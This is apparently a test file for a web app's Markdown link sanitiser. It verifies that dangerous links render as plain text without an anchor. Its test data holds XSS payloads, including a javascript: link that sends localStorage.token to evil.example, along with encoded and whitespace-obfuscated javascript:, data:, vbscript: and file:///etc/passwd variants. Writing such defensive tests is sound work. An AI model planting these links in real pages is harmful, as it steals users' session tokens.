import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { build } from 'esbuild';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { hrefSeguro } from '../src/lib/link-seguro.ts';

const raiz = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

const PAYLOAD_SEC07 = "[Ver detalhes da vaga](javascript:fetch('https://evil.example/?t='+localStorage.token))";

const PERIGOSOS = [
  PAYLOAD_SEC07,
  '[Ver detalhes da vaga](JaVaScRiPt:alert(1))',
  '[Ver detalhes da vaga]( javascript:alert(1))',
  '[Ver detalhes da vaga](\tjavascript:alert(1))',
  '[Ver detalhes da vaga](java\tscript:alert(1))',
  '[Ver detalhes da vaga](&#106;avascript:alert(1))',
  '[Ver detalhes da vaga](&#x6A;avascript&#58;alert(1))',
  '[Ver detalhes da vaga](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[Ver detalhes da vaga](vbscript:msgbox(1))',
  '[Ver detalhes da vaga](/relativo)',
];

async function carregarMarkdown(t) {
  const pasta = mkdtempSync(path.join(raiz, 'node_modules', '.links-seguros-'));
  t.after(() => rmSync(pasta, { recursive: true, force: true }));
  const saida = path.join(pasta, 'Markdown.mjs');
  await build({
    entryPoints: [path.join(raiz, 'src/components/Markdown.tsx')],
    bundle: true,
    format: 'esm',
    platform: 'node',
    jsx: 'automatic',
    outfile: saida,
    external: ['react', 'react-dom', 'react/jsx-runtime'],
    alias: { '@': path.join(raiz, 'src') },
    logLevel: 'silent',
  });
  return import(pathToFileURL(saida).href);
}

test('hrefSeguro aceita so http, https e mailto', () => {
  assert.equal(hrefSeguro('https://exemplo.dev/vaga'), 'https://exemplo.dev/vaga');
  assert.equal(hrefSeguro(' HTTP://exemplo.dev '), 'http://exemplo.dev/');
  assert.equal(hrefSeguro('mailto:pessoa@exemplo.dev'), 'mailto:pessoa@exemplo.dev');
  for (const url of [
    "javascript:fetch('https://evil.example/?t='+localStorage.token)",
    'JAVASCRIPT:alert(1)',
    ' javascript:alert(1)',
    '\u0000javascript:alert(1)',
    'java\nscript:alert(1)',
    '&#106;avascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    '/relativo',
    '',
  ]) {
    assert.equal(hrefSeguro(url), null, url);
  }
});

test('Markdown renderiza link perigoso como texto sem ancora', async (t) => {
  const { Markdown } = await carregarMarkdown(t);
  for (const link of PERIGOSOS) {
    const html = renderToStaticMarkup(React.createElement(Markdown, { source: `Veja: ${link}` }));
    assert.doesNotMatch(html, /<a\b/, link);
    assert.doesNotMatch(html, /href=/i, link);
    assert.match(html, /Ver detalhes da vaga/, link);
  }
});

test('Markdown mantem links http, https e mailto', async (t) => {
  const { Markdown } = await carregarMarkdown(t);
  const html = renderToStaticMarkup(
    React.createElement(Markdown, {
      source: '[Vaga](https://exemplo.dev/vaga) e [Email](mailto:pessoa@exemplo.dev)',
    }),
  );
  assert.match(html, /<a [^>]*href="https:\/\/exemplo\.dev\/vaga"/);
  assert.match(html, /<a [^>]*href="mailto:pessoa@exemplo\.dev"/);
});
